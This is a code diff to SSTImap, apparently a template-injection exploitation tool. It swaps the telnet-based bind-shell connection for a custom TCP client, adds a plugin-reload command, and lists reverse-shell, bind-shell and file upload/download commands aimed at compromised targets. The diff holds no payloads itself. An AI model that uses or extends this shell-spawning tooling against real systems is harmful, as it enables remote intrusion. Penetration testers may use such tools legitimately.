@@ -6,6 +6,7 @@ from core import checks
 from core.channel import Channel
 from core.clis import Shell, MultilineShell
 from core.tcpserver import TcpServer
+from core.tcpclient import TcpClient
 import telnetlib
 import socket
 
@@ -82,7 +83,10 @@ Exploitation:
   reverse, reverse_shell [HOST] [PORT]    Run a system shell and back-connect to local HOST PORT
   overwrite, force_overwrite              Toggle file overwrite when uploading
   up, upload [LOCAL] [REMOTE]             Upload LOCAL to REMOTE files
-  down, download [REMOTE] [LOCAL]         Download REMOTE to LOCAL files""")
+  down, download [REMOTE] [LOCAL]         Download REMOTE to LOCAL files
+
+SSTImap:
+  reload, reload_plugins                  Reload all SSTImap plugins""")
 
     def do_version(self, line):
         """Show current SSTImap version"""
@@ -543,16 +547,19 @@ Exploitation:
             for idx, thread in enumerate(self.current_plugin.bind_shell(port)):
                 log.log(26, f'Spawn a shell on remote port {port} with payload {idx+1}')
                 thread.join(timeout=1)
-                if not thread.is_alive():
-                    continue
-                try:
-                    telnetlib.Telnet(url.hostname.decode(), port, timeout=5).interact()
-                    return
-                except (KeyboardInterrupt, EOFError):
-                    print()
-                    log.log(26, 'Exiting bind shell')
-                except Exception as e:
-                    log.debug(f"Error connecting to {url.hostname}:{port} {e}")
+                if thread.is_alive():
+                    log.log(24, f'Shell with payload {idx+1} seems stable')
+                    break
+            try:
+                #telnetlib.Telnet(url.hostname.decode(), port, timeout=5).interact()
+                a = TcpClient(url.hostname, port, timeout=5)
+                a.shell()
+                return
+            except (KeyboardInterrupt, EOFError):
+                print()
+                log.log(26, 'Exiting bind shell')
+            except Exception as e:
+                log.log(25, f"Error connecting to {url.hostname}:{port} {e}")
         else:
             log.log(22, 'No TCP shell opening capabilities have been detected on the target')
 
@@ -637,3 +644,16 @@ Exploitation:
 
     do_up = do_upload
     do_down = do_download
+
+# SSTImap commands
+
+    def do_reload_modules(self, line):
+        """Reload all modules"""
+        from core.plugin import unload_plugins
+        from sstimap import load_plugins
+        unload_plugins()
+        load_plugins()
+        from core.plugin import loaded_plugins
+        log.log(23, f"Reloaded plugins by categories: {'; '.join([f'{x}: {len(loaded_plugins[x])}' for x in loaded_plugins])}")
+
+    do_reload = do_reload_modules
